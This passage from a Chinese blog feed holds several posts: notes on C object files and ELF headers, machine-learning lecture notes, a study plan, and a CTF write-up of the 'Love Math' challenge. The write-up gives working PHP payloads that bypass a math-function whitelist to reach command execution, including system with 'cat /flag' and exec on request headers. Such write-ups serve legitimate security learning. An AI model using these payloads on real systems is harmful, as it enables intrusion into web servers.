href="#c语言源代码中的变量和函数" class="headerlink" title="c语言源代码中的变量和函数"></a>c语言源代码中的变量和函数</h3><ul><li>声明和定义的区别：<ul><li>声明是告诉编译器该变量没有在当前文件中定义而是在其他文件中定义</li><li>定义变量是告诉编译器在生成的目标文件中留出空间来存放该变量</li><li>定义函数是告诉编译器在目标文件中生成该函数的二进制代码</li></ul></li></ul><p>变量类型如下：</p><ol><li>全局变量：非static，表示该变量的生命周期是整个程序的执行期间，可以被其他文件访问</li><li>全局变量：static，生命周期也是整个程序的执行期间，但是不能被其他文件访问</li><li>局部变量：static，生命周期是程序的执行期间，但是作用域仅在该函数体中</li><li>局部变量：非static，仅存在于当前当前函数体中</li></ol><p>对于函数也同理，如果定义了static则无法被其他文件所读取</p><h3 id="目标文件的格式"><a href="#目标文件的格式" class="headerlink" title="目标文件的格式"></a>目标文件的格式</h3><p>部分段名如下</p><ul><li>.data段保存已经初始化的全局静态变量和局部静态变量</li><li>.rodata段存放的是只读数据，一般是程序里面的只读变量（const修饰的）和字符串常量</li><li>.bss段存放的是未初始化的全局变量和局部静态变量</li><li>.comment存放的是编译器版本信息</li><li>.debug存放调试信息</li><li>.dynamic存放动态链接信息</li><li>.strtab String Table字符串表，用于存放ELF文件中用到的各种字符串</li><li>.symtab Symbol Table符号表</li><li>.plt .got 动态链接的跳转表和全局入口表</li><li>.init 程序初始化段</li><li>.fini 程序终结代码段</li></ul><p>ELF文件头结构体如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        e_ident[EI_NIDENT];        <span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf32_Half        e_type;                        <span class="comment">/* Object file type */</span></span><br><span class="line">  Elf32_Half        e_machine;                <span class="comment">/* Architecture */</span></span><br><span class="line">  Elf32_Word        e_version;                <span class="comment">/* Object file version */</span></span><br><span class="line">  Elf32_Addr        e_entry;                <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf32_Off        e_phoff;                <span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf32_Off        e_shoff;                <span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf32_Word        e_flags;                <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf32_Half        e_ehsize;                <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf32_Half        e_phentsize;                <span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf32_Half        e_phnum;                <span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf32_Half        e_shentsize;                <span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf32_Half        e_shnum;                <span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf32_Half        e_shstrndx;                <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        e_ident[EI_NIDENT];        <span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf64_Half        e_type;                        <span class="comment">/* Object file type */</span></span><br><span class="line">  Elf64_Half        e_machine;                <span class="comment">/* Architecture */</span></span><br><span class="line">  Elf64_Word        e_version;                <span class="comment">/* Object file version */</span></span><br><span class="line">  Elf64_Addr        e_entry;                <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf64_Off        e_phoff;                <span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf64_Off        e_shoff;                <span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf64_Word        e_flags;                <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf64_Half        e_ehsize;                <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf64_Half        e_phentsize;                <span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf64_Half        e_phnum;                <span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf64_Half        e_shentsize;                <span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf64_Half        e_shnum;                <span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf64_Half        e_shstrndx;                <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf64_Ehdr;</span><br></pre></td></tr></table></figure><p>ELF header结构体如下<br><img src="https://i.loli.net/2021/03/09/VwWutzkDLN934Zy.png" style="zoom:50%;" /></p><h3 id="源代码到目标文件的处理"><a href="#源代码到目标文件的处理" class="headerlink" title="源代码到目标文件的处理"></a>源代码到目标文件的处理</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> globalA = <span class="number">2333</span>;</span><br><span class="line"><span class="keyword">int</span> globalB;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> globalC = <span class="number">666</span>;  <span class="comment">// 全局static</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> globalD;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> globalE; <span class="comment">// 声明全局变量</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">Print</span><span class="params">()</span></span>; <span class="comment">// 声明函数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> a = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> b;</span><br><span class="line"><span class="keyword">int</span> c = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> d;</span><br><span class="line">test(<span class="number">12</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过nm命令来查看目标文件的符号，从左到右分别是变量的相对地址，变量所在段的名字和变量名字。<br><img src="https://i.loli.net/2021/03/09/15H7DNjxQdUslnV.png" style="zoom:50%;" ></p><p>其中a.1922是编译器修改变量名字的结果，因为a是一个局部静态变量，作用域在他的函数体中，所以当我们在不同的函数体中声明相同名字的局部静态变量（这种操作是被允许的）而且其生命周期为整个程序执行时，编译器为了支持这种功能，所以来加后缀来标识不同的局部静态变量。</p><p>我们还可以用objdump来查看目标文件的结构，-h参数可查看各个段的基本信息</p><p><img src="https://i.loli.net/2021/03/09/5GTWh29juR6pxUZ.png" style="zoom:50%;" /></p><p>Size表示段长度<br>File off表示在文件中的偏移<br>每个段第二行中的”CONTENTS” “ALLOC”等表示段的属性，”CONTENTS”表示在文件中存在<br>比如数据段的大小为0xc字节大小，因为有三个四字节的变量分别为globalA,globalC和a</p><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>使用如下命令来完成链接过程<br><code>gcc Binary.o -o BinaryName</code></p><p><img src="https://i.loli.net/2021/03/09/4MySVpGcZOiLqQr.png" style="zoom:50%;" /></p><p>可以看到之前的一些相对地址全部变为了绝对地址，完成了地址重定位</p><h2 id="装载运行"><a href="#装载运行" class="headerlink" title="装载运行"></a>装载运行</h2><p>当程序加载进内存程序即可运行，在这个过程中我们不得不提到虚拟内存，动态链接库和函数执行的问题。我们给出程序执行的顺序，具体探究我们等到之后的文章再另行分析。</p><blockquote><p>  1.首先 bash 进行 fork 系统调用，生成一个子进程，接着在子进程中运行 execve 函数指定的 elf 二进制程序（ Linux中执行二进制程序最终都是通过 execve 这个库函数进行的），execve 会调用系统调用把 elf 文件 load 到内存中的代码段(_text)中。<br>2.如果有依赖的动态链接库，会调用动态链接器进行库文件的地址映射，动态链接库的内存空间是被多个进程共享的。<br>3.内核从 elf 文件头得到_start的地址，调度执行流从_start指向的地址开始执行，执行流在_start执行的代码段中跳转到libc中的公共初始化代码段<strong>libc_start_main，进行程序运行前的初始化工作。<br>4.</strong>libc_start_main的执行过程中，会跳转到_init中全局变量的初始化工作，随后调用我们的main函数，进入到主函数的指令流程。</p></blockquote><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>《程序员的自我修养》</li><li><a href="https://www.nosuchfield.com/2018/11/23/Program-compilation-linking-loading-and-running/">https://www.nosuchfield.com/2018/11/23/Program-compilation-linking-loading-and-running/</a></li><li><a href="https://tech.meituan.com/2015/01/22/linker.html">https://tech.meituan.com/2015/01/22/linker.html</a></li><li><a href="https://code.woboq.org/">https://code.woboq.org/</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 二进制 </tag>
            
            <tag> 程序与操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf:[CISCN 2019 初赛] Love Math-总结数学中的命令执行</title>
      <link href="2021/03/06/web1-love-math/"/>
      <url>2021/03/06/web1-love-math/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li>开局给了源码 拿到本地分析一下<br><img src="https://i.loli.net/2021/03/06/oLhWucimrZ1tPB2.png" alt="1.png"></li></ul><p><img src="https://i.loli.net/2021/03/06/JiyeCSQMwdnHIXq.png" alt="2.png"></p><p><img src="https://i.loli.net/2021/03/06/V1DGCytmnK2Yai9.png" alt="3.png"></p><p>白名单只给了一堆数学函数<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br></pre></td></tr></table></figure></p><p>从里面找出来能够利用的拼凑出命令执行</p><p>最终肯定希望能够达成这样的结果<code>eval(&#39;echo&#39; . &#39;$_POST[1]&#39; . &#39;;&#39;)</code><br>所以难点在于如何利用已知函数来拼凑出$_POST</p><h3 id="几个函数"><a href="#几个函数" class="headerlink" title="几个函数"></a>几个函数</h3><ol><li>hex2bin — 转换十六进制字符串为二进制字符串</li><li>base_convert — 在任意进制之间转换数字，最高为36进制</li><li>dechex — 十进制转换为十六进制</li></ol><p>利用base_convert凑出来hex2bin,再利用hex2bin凑出来_POST,最后用可变变量完成命令执行</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">409369269076</span>));<span class="variable">$$pi</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$$pi</span>&#123;<span class="number">2</span>&#125;)</span><br><span class="line"></span><br><span class="line">c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>); <span class="comment">// base_convert(37907361743,10,36) = hex2bin</span></span><br><span class="line">dechex(<span class="number">409369269076</span>); <span class="comment">// 转成_POST字符串的十六进制</span></span><br><span class="line"></span><br><span class="line">以上两个语句合起来为 <span class="variable">$pi</span> = hex2bin(<span class="string">&#x27;5f504f5354&#x27;</span>) = _POST;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$pi</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$$pi</span>&#123;<span class="number">2</span>&#125;) = <span class="variable">$_POST</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$_POST</span>&#123;<span class="number">2</span>&#125;); <span class="comment">// 中括号被ban,用大括号来绕过</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/06/oC6xULjHR1aP9kD.png" alt="4.png"></p><h2 id="其他payload"><a href="#其他payload" class="headerlink" title="其他payload"></a>其他payload</h2><h3 id="get传入参数命令执行"><a href="#get传入参数命令执行" class="headerlink" title="get传入参数命令执行"></a>get传入参数命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="variable">$abs</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));<span class="variable">$$abs</span>&#123;pi&#125;(<span class="variable">$$abs</span>&#123;sin&#125;)&amp;pi=system&amp;sin=cat /flag</span><br><span class="line"></span><br><span class="line"><span class="variable">$abs</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>)) = _GET;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$abs</span>&#123;pi&#125;(<span class="variable">$$abs</span>&#123;sin&#125; = <span class="variable">$_GET</span>&#123;pi&#125;(<span class="variable">$_GET</span>&#123;sin&#125;); <span class="comment">// 通过get方法传入参数完成命令执行</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="headers传入参数命令执行"><a href="#headers传入参数命令执行" class="headerlink" title="headers传入参数命令执行"></a>headers传入参数命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="variable">$pi</span>=base_convert,<span class="variable">$pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)((<span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable">$pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) = base_convert(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) = exec</span><br><span class="line">((<span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;) = ((base_convert(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;) = getallheaders()&#123;<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">即 exec(getallheaders()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>几点说明</p><p>getallheaders — 获取全部 HTTP 请求头信息</p><p><img src="https://i.loli.net/2021/03/06/CcBEwGWhjMp9AmO.png" alt="5.png"></p><p>当取数组元素时，用大括号会抛出警告而不是错误</p><p><img src="https://i.loli.net/2021/03/06/WtgMeZJO6rl25QV.png" alt="6.png"></p><p>用上述payload 加上 postman改下headers即可命令执行getflag</p><p><img src="https://i.loli.net/2021/03/06/4kdNB8AUj59IiHu.png" alt="9.png"></p><h3 id="字符串异或命令执行"><a href="#字符串异或命令执行" class="headerlink" title="字符串异或命令执行"></a>字符串异或命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$whitelist</span> <span class="keyword">as</span> <span class="variable">$white</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">999999</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ decbin(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;decbin:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ decoct(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;decoct:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ dechex(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;dechex:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> .  <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/06/uGUmVAZe5BXbazM.png" alt="7.png"></p><p>发现俩能用的</p><p><code>payload:?c=$pi=dechex(481137)^hexdec;$$pi&#123;1&#125;($$pi&#123;2&#125;)</code></p><p><img src="https://i.loli.net/2021/03/06/y6aTOkVeDoFPcmC.png" alt="8.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html">https://www.cnblogs.com/wangtanzhi/p/12246731.html</a><br><a href="https://www.bilibili.com/video/BV1pE411f7DN?t=1567">https://www.bilibili.com/video/BV1pE411f7DN?t=1567</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> web </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Machine Learning</title>
      <link href="2021/03/05/ML/"/>
      <url>2021/03/05/ML/</url>
      
        <content type="html"><![CDATA[<h2 id="1-4-Unsupervised-Learning"><a href="#1-4-Unsupervised-Learning" class="headerlink" title="1-4.Unsupervised Learning"></a>1-4.Unsupervised Learning</h2><p>google news：聚类算法，无监督学习算法</p><p><img src="https://i.loli.net/2021/03/06/1TFOpXztKCkwcrW.png" alt="image-20210306085443145.png"></p><p>聚类算法是unsupervised learning的一种</p><p><img src="https://i.loli.net/2021/03/06/r5F1CvS3Zx9bGOk.png" alt=""></p><blockquote><p>B is a unsupervised learning problem.</p></blockquote><h2 id="2-1-模型描述"><a href="#2-1-模型描述" class="headerlink" title="2-1.模型描述"></a>2-1.模型描述</h2><p><img src="https://i.loli.net/2021/03/06/fF3lQLcRgkxP5iW.png" alt=""></p><p>根据拟合状况预估房价，是一个supervised learning problem，因为每一个大小都有一个“正确的答案”，并且还是回归问题。</p><p>Notation:</p><ul><li>m = Number of training examples</li><li>x = “input” variable / features</li><li><p>y = “output” variable / “target” variable</p></li><li><p>(x,y) = one traing example</p></li><li><p>$(x^{(i)},y^{(i)})$ = $i^{th}$   training example (not exponentiation,i means “index”)</p></li><li><p>h = hypothesis</p></li></ul><p><img src="https://i.loli.net/2021/03/06/2EMSJuBbaqKs6oI.png" alt=""><br>Linear regression with one variable.Univariate linear regression.(one variable)</p><h2 id="2-2代价函数-一"><a href="#2-2代价函数-一" class="headerlink" title="2.2代价函数(一)"></a>2.2代价函数(一)</h2><p><img src="https://i.loli.net/2021/03/06/U9H7TZXSpEtYdaj.png" alt=""></p><p>Cost function  </p><script type="math/tex; mode=display">J(\theta_0,\theta_1)=\frac 1{2m}\sum_{i=1}^m(h_{\theta}(x^{(i)}-y^{(i)})^2</script><h2 id="2-3代价函数-二"><a href="#2-3代价函数-二" class="headerlink" title="2.3代价函数(二)"></a>2.3代价函数(二)</h2><p><img src="https://i.loli.net/2021/03/06/jwi5Mp2K8b3CLPq.png" alt=""></p><p><img src="https://i.loli.net/2021/03/06/4sFmDZuqdGVTi7S.png" alt=""></p><p>简化代价函数使得$\theta_0 = 0$，理解代价函数</p><p>对于上图特殊的training set，可以找出$\theta_1 = 1$时，可以完美拟合</p><h2 id="2-4代价函数-三"><a href="#2-4代价函数-三" class="headerlink" title="2.4代价函数(三)"></a>2.4代价函数(三)</h2><p>当我们使用$\theta_0$和$\theta_1$时，得到cost function图像类似下图</p><p><img src="https://i.loli.net/2021/03/06/skDZCp4OwtTFYib.png" alt=""></p><p>使用等高线的方式来模拟，想象从碗的上方向底部看，minimize J($\theta_0$,$\theta_1$) 就是椭圆的中心，如下图的数据拟合较为不错，cost value可以接受</p><p><img src="https://i.loli.net/2021/03/06/JVmZ7oFTpRDU1zd.png" alt=""></p><h2 id="2-5-梯度下降"><a href="#2-5-梯度下降" class="headerlink" title="2.5 梯度下降"></a>2.5 梯度下降</h2><p>Repeat until convergence{</p><p>​    $\theta_j := \theta_j - \alpha\frac{\partial}{\partial\theta_j}J(\theta_0,\theta_1)  $        (for j = 0 and j = 1) </p><p>}</p><p>// := assignment       ( a := a + 1)</p><p>// $\alpha$为学习率，大的时候下山步子大</p><p><img src="https://i.loli.net/2021/03/09/gQYal6ocdpKqC9R.png" alt="梯度下降1.png" style="zoom:50%;" /></p><h2 id="2-6-梯度下降理解"><a href="#2-6-梯度下降理解" class="headerlink" title="2.6 梯度下降理解"></a>2.6 梯度下降理解</h2><ul><li>梯度下降导数项的意义</li></ul><p><img src="https://i.loli.net/2021/03/09/CyXR7G4TLIKQO1w.png" alt="梯度下降2.png" style="zoom:50%;" /></p><ul><li>梯度下降学习率大小的意义</li></ul><p><img src="https://i.loli.net/2021/03/09/N1mFSpIkrPAnljb.png" alt="梯度下降3-alpha含义.png" style="zoom:50%;" /></p><ul><li>梯度下降到局部最优点的结果</li></ul><p><img src="https://i.loli.net/2021/03/09/nSg2xDTV7yROecG.png" alt="梯度下降4-局部最优点的结果.png" style="zoom:50%;" /></p><h2 id="2-7-线性回归的梯度下降"><a href="#2-7-线性回归的梯度下降" class="headerlink" title="2.7 线性回归的梯度下降"></a>2.7 线性回归的梯度下降</h2><p>梯度下降中导数那一项：</p><script type="math/tex; mode=display">\frac\partial{\partial\theta_j}J(\theta_0,\theta_1) = \frac\partial{\partial\theta_j}\frac1{2m}\sum_{i=1}^m(h_\theta(x^{(i)})-y^{(i)})^2 \\=\frac\partial{\partial\theta_j}\frac1{2m}\sum_{i=1}^m(\theta_0 + \theta_1x^{i}-y^{(i)})^2</script><p>$\theta_0$和$\theta_1$情况下的偏导数：</p><script type="math/tex; mode=display">j=0:\frac\partial{\partial\theta_0}J(\theta_0,\theta_1)=\frac1{m}\sum_{i=1}^m(h_\theta(x^{(i)})-y^{(i)}) \\j=1:\frac\partial{\partial\theta_1}J(\theta_0,\theta_1)=\frac1{m}\sum_{i=1}^m(h_\theta(x^{(i)})-y^{(i)})*x^{(i)}</script><p>该方法是Batch梯度下降法：需要遍历整个训练集</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Machine Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计划</title>
      <link href="2021/03/05/plan1/"/>
      <url>2021/03/05/plan1/</url>
      
        <content type="html"><![CDATA[<h2 id="计划2021-3-2021-5"><a href="#计划2021-3-2021-5" class="headerlink" title="计划2021.3 - 2021.5"></a>计划2021.3 - 2021.5</h2><blockquote><p>1.web学习<br>2.buu pwn题<br>3.机器学习入门<br>4.操作系统(李治军老师)<br>5.运维(hvv)<br>划掉</p></blockquote><p>目前大二，想冲一下保研的资格，ctf要搁置了草</p><blockquote><p>1.蓝桥杯<br>2.数学建模<br>3.ciscn<br>4.论文<br>5.英语</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学笔记</title>
      <link href="2021/03/05/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/"/>
      <url>2021/03/05/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/</url>
      
